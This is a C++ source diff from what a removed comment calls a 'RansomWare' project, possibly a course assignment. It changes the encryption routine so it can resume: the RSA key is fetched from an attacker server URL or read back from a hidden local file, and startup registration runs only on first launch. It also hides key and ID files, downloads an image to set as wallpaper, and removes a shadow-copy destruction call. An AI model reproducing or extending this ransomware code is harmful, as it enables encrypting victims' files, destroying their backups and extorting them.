@@ -27,15 +27,32 @@ void doRestart();
 void makeFileHidden(string path);
 void RegisterProgram();
 
-Status getPublicParams(string id, string& mod, string& pubKey);
+Status getPublicParams(string id, string& mod, string& pubKey, bool fromStart);
 
-Status getPublicParams(string id, string& mod, string& pubKey)
-{
-	string url = URL_PUBLIC_RSA + id;
+Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
+{	
 	string chunk;
+	Status status = STATUS_SUCCESS;
+	if(fromStart)
+	{
+		string url = URL_PUBLIC_RSA + id;
+		
+		status = getFromServer(url, chunk);
+	}
+	else
+	{
+		std::fstream pubFile;
+		string pathToENC = get_path_to_ENC();
+		pubFile.open(pathToENC, std::ios::in);
+		if (!pubFile.is_open())
+		{
+			std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
+			return STATUS_UNSUCCESSFUL;
+		}
+		chunk = std::string((std::istreambuf_iterator<char>(pubFile)), std::istreambuf_iterator<char>());
+		pubFile.close();
+	}
 
-	Status status;
-	status = getFromServer(url, chunk);
 
 	parsePublicKey(chunk, mod, pubKey);
 	return status;
@@ -48,8 +65,12 @@ int encryption_main( bool fromStart) {
 	string pubKey;
 	string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
+
 #if VM
-	RegisterProgram();
+	if(fromStart)
+	{
+		RegisterProgram();
+	}
 #endif
 	changeHiddenFileState(false);
 
@@ -82,7 +103,7 @@ int encryption_main( bool fromStart) {
 	strID.assign((char*)id, ID_LEN);
 	strID = string_to_hex(strID);
 
-	status = getPublicParams(strID, mod, pubKey);
+	status = getPublicParams(strID, mod, pubKey, fromStart);
 	//status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	if(!NT_SUCCESS(status))
 	{
@@ -95,20 +116,17 @@ int encryption_main( bool fromStart) {
 	{
 		goto CLEAN;
 	}
-#if VM
-	destroyVSS();
-#endif
-	
 
-//	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
-//	std::ofstream masterKeyIVFile;
-//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
-//	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
-//	masterKeyIVFile.write((char*)masterIV, IV_LEN);
-//	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
-//	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
-//	masterKeyIVFile.close();
-	
+	pubFile.open(pathToENC, std::ios::out);
+	if (!pubFile.is_open())
+	{
+		std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
+		return -1;
+	}
+	pubFile << "<Modulus>" << mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
+	pubFile.close();
+	makeFileHidden(pathToENC);
+
 	IDFile.open(pathToID, std::ios::out);
 	if(!IDFile.is_open())
 	{
@@ -120,15 +138,7 @@ int encryption_main( bool fromStart) {
 	IDFile.close();
 	makeFileHidden(pathToID);
 
-	pubFile.open(pathToENC, std::ios::out);
-	if (!pubFile.is_open())
-	{
-		std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
-		return -1;
-	}
-	pubFile << "<Modulus>"<< mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
-	pubFile.close();
-	makeFileHidden(pathToENC);
+
 
 
 	
@@ -158,17 +168,7 @@ int encryption_main( bool fromStart) {
 	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
 	makeFileHidden(pathToImage);
 	changeHiddenFileState(true);
-//#ifdef DEBUG
-//	std::cout << "Username: " << get_username() << std::endl;
-//	encrypt(d, "./README.md");
-//#endif
-//
-//	send();
-//
-//	delete d;
-//
-//	notify();
-//
+
 #if VM
 	changeWallPaper(pathToImage);//TODO move to notify
 #endif
